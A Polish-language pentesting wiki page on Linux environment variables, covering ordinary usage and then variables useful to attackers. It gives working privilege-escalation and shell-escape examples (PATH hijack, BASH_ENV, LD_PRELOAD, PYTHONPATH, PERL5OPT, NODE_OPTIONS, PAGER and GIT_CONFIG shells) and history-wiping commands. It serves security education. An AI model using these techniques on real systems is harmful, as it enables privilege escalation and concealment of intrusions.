# Zmienne środowiskowe Linuxa

## Zmienne globalne

Zmienne globalne **będą** dziedziczone przez **procesy potomne**.

Możesz utworzyć zmienną globalną dla bieżącej sesji, wykonując:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Ta zmienna będzie dostępna w bieżących sesjach i ich procesach potomnych.

Możesz **usunąć** zmienną, wykonując:
```bash
unset MYGLOBAL
```
## Zmienne lokalne

Do **zmiennych lokalnych** można uzyskać dostęp wyłącznie z poziomu **bieżącej powłoki/skryptu**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Lista bieżących zmiennych
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
Zawartość plików `/proc/*/environ` jest **rozdzielana znakami NUL**, więc te warianty są zwykle łatwiejsze do odczytania:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Jeśli szukasz **credentials** lub **interesującej konfiguracji usług** w odziedziczonych środowiskach, sprawdź również [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Common variables

Źródło: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – wyświetlacz używany przez **X**. Ta zmienna jest zwykle ustawiona na **:0.0**, co oznacza pierwszy wyświetlacz na bieżącym komputerze.
- **EDITOR** – preferowany przez użytkownika edytor tekstu.
- **HISTFILESIZE** – maksymalna liczba wierszy zawartych w pliku historii.
- **HISTSIZE** – liczba wierszy dodawanych do pliku historii po zakończeniu sesji przez użytkownika.
- **HOME** – katalog domowy.
- **HOSTNAME** – hostname komputera.
- **LANG** – bieżący język.
- **MAIL** – lokalizacja spoola pocztowego użytkownika. Zwykle **/var/spool/mail/USER**.
- **MANPATH** – lista katalogów przeszukiwanych pod kątem stron podręcznika.
- **OSTYPE** – typ systemu operacyjnego.
- **PS1** – domyślny prompt w bash.
- **PATH** – przechowuje ścieżki wszystkich katalogów zawierających pliki binarne, które chcesz uruchamiać, podając jedynie nazwę pliku, a nie ścieżkę względną lub absolutną.
- **PWD** – bieżący katalog roboczy.
- **SHELL** – ścieżka do bieżącej powłoki poleceń (na przykład **/bin/bash**).
- **TERM** – bieżący typ terminala (na przykład **xterm**).
- **TZ** – strefa czasowa.
- **USER** – bieżąca nazwa użytkownika.

## Interesting variables for hacking

Nie każda zmienna jest równie przydatna. Z perspektywy offensive priorytetowo traktuj zmienne, które zmieniają **ścieżki wyszukiwania**, **pliki startowe**, **zachowanie dynamicznego linkera** lub **audytowanie/logowanie**.

### **HISTFILESIZE**

Zmień **wartość tej zmiennej na 0**, aby po **zakończeniu sesji** **plik historii** (\~/.bash_history) został **skrócony do 0 wierszy**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Zmień **wartość tej zmiennej na 0**, aby polecenia **nie były przechowywane w historii w pamięci** i nie były zapisywane z powrotem do **pliku historii** (\~/.bash_history).
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

Jeśli **wartość tej zmiennej jest ustawiona na `ignorespace` lub `ignoreboth`**, żadna komenda poprzedzona dodatkową spacją nie zostanie zapisana w historii.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Skieruj **`plik historii`** do **`/dev/null`** lub całkowicie go wyłącz. Jest to zwykle bardziej niezawodne niż samo zmienienie rozmiaru historii.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Procesy będą używać zadeklarowanego tutaj **proxy**, aby łączyć się z internetem za pośrednictwem **http lub https**.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy i no_proxy

- `all_proxy`: domyślny proxy dla narzędzi/protokołów, które go respektują.
- `no_proxy`: lista pomijania proxy (hosty/domeny/CIDR), które powinny łączyć się bezpośrednio.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Można używać zarówno wariantów pisanych małymi, jak i wielkimi literami, zależnie od narzędzia (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Procesy będą ufać certyfikatom wskazanym w **tych zmiennych środowiskowych**. Jest to przydatne, aby narzędzia takie jak **`curl`**, **`git`**, klienci HTTP w Pythonie lub menedżery pakietów ufały CA kontrolowanemu przez atakującego (na przykład aby proxy przechwytujące wyglądało na legalne).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Jeśli uprzywilejowany wrapper/skrypt wykonuje polecenia **bez ścieżek absolutnych**, wygrywa **pierwszy kontrolowany przez attackera katalog** w `PATH`. To primitive leżący u podstaw wielu **PATH hijacks** w `sudo`, zadaniach cron, wrapperach powłoki i niestandardowych helperach SUID. Szukaj `env_keep+=PATH`, słabego `secure_path` lub wrapperów, które wywołują `tar`, `service`, `cp`, `python` itd. po nazwie.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
W przypadku pełnych łańcuchów privilege-escalation wykorzystujących `PATH` sprawdź [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` to nie tylko odwołanie do katalogu: wiele narzędzi automatycznie ładuje **dotfiles**, **plugins** i **konfigurację użytkownika** z `$HOME` lub `$XDG_CONFIG_HOME`. Jeśli uprzywilejowany workflow zachowuje te wartości, **config injection** może być łatwiejsze niż **binary hijacking**.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Interesujące cele obejmują `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` oraz pliki specyficzne dla narzędzi, takie jak `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Zmienne te wpływają na **dynamic linker**:

- `LD_PRELOAD`: wymusza wcześniejsze załadowanie dodatkowych shared objects.
- `LD_LIBRARY_PATH`: dodaje katalogi wyszukiwania bibliotek na początku listy.
- `LD_AUDIT`: ładuje biblioteki audytujące, które obserwują ładowanie bibliotek i rozwiązywanie symboli.

Są niezwykle wartościowe w **hooking**, **instrumentation** i **privilege escalation**, jeśli uprzywilejowane polecenie je zachowuje. W trybie **secure-execution** (`AT_SECURE`, np. setuid/setgid/capabilities) loader usuwa wiele z tych zmiennych lub ogranicza ich działanie. Jednak parser bugs na tym wczesnym etapie działania loadera nadal mają duże znaczenie, ponieważ występują **przed** uruchomieniem programu docelowego.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` zmienia wczesne działanie glibc (na przykład opcje konfiguracyjne alokatora) i jest bardzo przydatne w laboratoriach exploitów. Ma również znaczenie z perspektywy bezpieczeństwa, ponieważ **dynamiczny loader analizuje tę zmienną bardzo wcześnie**. Błąd **Looney Tunables** z 2023 roku był dobrym przypomnieniem, że pojedyncza zmienna środowiskowa analizowana przez loader może stać się **prymitywem lokalnej eskalacji uprawnień** przeciwko programom SUID.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

Jeśli **Bash** jest uruchamiany **nieinteraktywnie**, sprawdza `BASH_ENV` i wykonuje zawartość tego pliku przed uruchomieniem docelowego skryptu. Gdy Bash jest wywoływany jako `sh` lub działa w interaktywnym trybie POSIX, może również sprawdzać `ENV`. Jest to klasyczny sposób na przekształcenie wrappera powłoki w wykonanie kodu, jeśli środowisko jest kontrolowane przez atakującego.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash ignoruje te pliki startowe, gdy **rzeczywiste/efektywne identyfikatory różnią się**; `-p` zachowuje efektywny identyfikator, ale nie włącza tych plików startowych, więc dokładne zachowanie zależy od sposobu, w jaki wrapper uruchamia powłokę. Należy uważać na uprzywilejowane wrappery, które wywołują `setuid()`/`setgid()` **przed** uruchomieniem Bash: gdy identyfikatory ponownie się zgadzają, Bash może zaufać `BASH_ENV`, `ENV` i powiązanemu stanowi powłoki, które w przeciwnym razie zostałyby zignorowane.<sup>[[1]](#references)</sup>

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

Zmienne te zmieniają sposób uruchamiania Pythona:

- `PYTHONPATH`: dodaje ścieżki wyszukiwania importów na początku.
- `PYTHONHOME`: przenosi drzewo biblioteki standardowej.
- `PYTHONSTARTUP`: wykonuje plik przed wyświetleniem interaktywnego promptu.
- `PYTHONINSPECT=1`: przechodzi do trybu interaktywnego po zakończeniu działania skryptu.

Są przydatne przeciwko skryptom utrzymaniowym, debuggerom, powłokom i wrapperom, które wywołują Pythona ze środowiskiem, nad którym można sprawować kontrolę. `python -E` i `python -I` ignorują wszystkie zmienne `PYTHON*`.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
Niedawnym przykładem z rzeczywistego świata był **needrestart** LPE z 2024 roku w systemach Ubuntu/Debian: skaner należący do roota kopiował `PYTHONPATH` nieuprzywilejowanego procesu z `/proc/<PID>/environ`, a następnie wykonywał Pythona. Opublikowany exploit umieszczał `importlib/__init__.so` w ścieżce kontrolowanej przez attackera, dzięki czemu Python wykonywał kod attackera podczas własnej inicjalizacji, zanim hard-coded skrypt helpera miał jakiekolwiek znaczenie.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl ma równie przydatne zmienne startowe:

- `PERL5LIB`: dodaje katalogi bibliotek na początku ścieżki.
- `PERL5OPT`: wstrzykuje przełączniki tak, jakby znajdowały się w każdym wierszu poleceń `perl`.

Może to wymusić **automatyczne ładowanie modułów** lub zmienić zachowanie interpretera, zanim targetowy skrypt zrobi cokolwiek interesującego. Perl ignoruje te zmienne w kontekstach **taint / setuid / setgid**, ale nadal mają one duże znaczenie w przypadku zwykłych wrapperów uruchamianych jako root, zadań CI, instalatorów i niestandardowych reguł sudoers.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` dodaje **flagi CLI Node.js** przed argumentami każdego procesu `node`, który dziedziczy środowisko. Dzięki temu jest przydatne przeciwko wrapperom, zadaniom CI, helperom Electron oraz regułom sudo, które ostatecznie uruchamiają Node. Z punktu widzenia atakującego najciekawsze flagi to zwykle:

- `--require <file>`: wstępnie ładuje plik CommonJS przed skryptem docelowym.
- `--import <module>`: wstępnie ładuje moduł ES przed skryptem docelowym.

Node odrzuca niektóre niebezpieczne flagi w `NODE_OPTIONS`, ale `--require` i `--import` są jawnie dozwolone i przetwarzane **przed** zwykłymi argumentami wiersza poleceń.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
W przypadku zdalnych gadget chains, które ustawiają `NODE_OPTIONS` pośrednio (na przykład poprzez prototype-pollution do RCE), sprawdź [tę inną stronę](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby oferuje tę samą klasę nadużyć podczas uruchamiania:

- `RUBYLIB`: dodaje katalogi na początku ścieżki ładowania Ruby.
- `RUBYOPT`: wstrzykuje opcje wiersza poleceń, takie jak `-r`, do każdego wywołania `ruby`.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Wykryte w 2024 roku vulnerabilities w **needrestart** pokazały, że nie jest to tylko trik laboratoryjny: ten sam helper należący do root, który był podatny na nadużycie `PYTHONPATH`, można było również zmusić do uruchomienia Ruby z kontrolowaną przez atakującego wartością `RUBYLIB`, wczytując `enc/encdb.so` z katalogu atakującego.<sup>[[3]](#references)</sup>

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Niektóre narzędzia nie tylko odczytują ścieżkę ze środowiska; przekazują tę wartość do **shella**, **edytora** lub **preprocesora wejścia**. Z tego powodu poniższe zmienne są szczególnie interesujące, gdy uprzywilejowany wrapper uruchamia `git`, `man`, `less` lub podobne przeglądarki tekstu:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: wybierają polecenie pagera.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: wybierają polecenie edytora, często wraz z argumentami.
- `LESSOPEN`, `LESSCLOSE`: definiują pre- i postprocesory uruchamiane, gdy `less` otwiera plik.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git obsługuje również **wstrzykiwanie konfiguracji wyłącznie przez zmienne środowiskowe** bez zapisywania czegokolwiek na dysku za pomocą `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` oraz `GIT_CONFIG_VALUE_<n>`:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Z perspektywy post-exploitation pamiętaj również, że odziedziczone środowiska często zawierają **dane uwierzytelniające**, **ustawienia proxy**, **tokeny usług** lub **klucze cloud**. Sprawdź [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) pod kątem `/proc/<PID>/environ` oraz wyszukiwania `Environment=` w `systemd`.

### PS1

Zmień wygląd swojego promptu.

[**To jest przykład**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: To jest przykład](<../images/image (897).png>)

Zwykły użytkownik:

![PERL5OPT & PERL5LIB - PS1: Jedno, dwa i trzy zadania uruchomione w tle](<../images/image (740).png>)

Jedno, dwa i trzy zadania uruchomione w tle:

![PERL5OPT & PERL5LIB - PS1: Jedno, dwa i trzy zadania uruchomione w tle](<../images/image (145).png>)

Jedno zadanie w tle, jedno zatrzymane, a ostatnie polecenie nie zakończyło się poprawnie:

![PERL5OPT & PERL5LIB - PS1: Jedno zadanie w tle, jedno zatrzymane, a ostatnie polecenie nie zakończyło się poprawnie](<../images/image (715).png>)

## References

- [1] [Podręcznik GNU Bash - Pliki startowe Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Strona podręcznika Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPE w needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Dokumentacja CLI Node.js - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Typowe zmienne środowiskowe - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Local Privilege Escalation w ld.so biblioteki glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
{{#include ../../banners/hacktricks-training.md}}
